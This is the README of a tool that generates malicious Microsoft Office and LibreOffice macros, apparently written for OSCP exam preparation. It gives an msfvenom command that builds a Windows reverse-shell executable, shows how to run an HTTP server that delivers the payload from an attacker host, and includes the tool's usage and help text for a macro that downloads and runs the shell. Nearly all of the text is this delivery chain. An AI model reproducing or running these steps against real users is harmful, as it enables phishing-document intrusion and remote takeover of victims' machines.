### macro-generator.py: Generate malicious macros using different techniques for MS Office and Libreoffice

One script to quickly generate macros with reverse shell using 3 methods for MS Office and 1 for Libreoffice or Openoffice
Created when preparing for OSCP

Create a reverse shell exe with something like the following
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o win/rshell.exe
```

Set a http server up to deliver payload using techniques 3 and 4
```
python3 -m http.server -d . 80
```

Generate macros to paste in Microsoft Office and Libre Office
```
python3 macro-generator.py --host 192.168.1.1 --port 443 -r ':80/win/rshell.exe'
```

Help Menu
```
Usage: macro-generator.py: Generate malicious macros using different techniques for MS Office and Libreoffice [-h] [-l HOST] [-p PORT] [-r RSHELL_PATH]

options:
  -h, --help            show this help message and exit
  -l HOST, --host HOST  IP address of attacker host
  -p PORT, --port PORT  PORT number of attacker listener
  -r RSHELL_PATH, --rshell RSHELL_PATH
                        Reverse rshell.exe location hosted on attacker machine, default=/win/rshell.exe, i.g ":8000/exp/shell.exe"

```

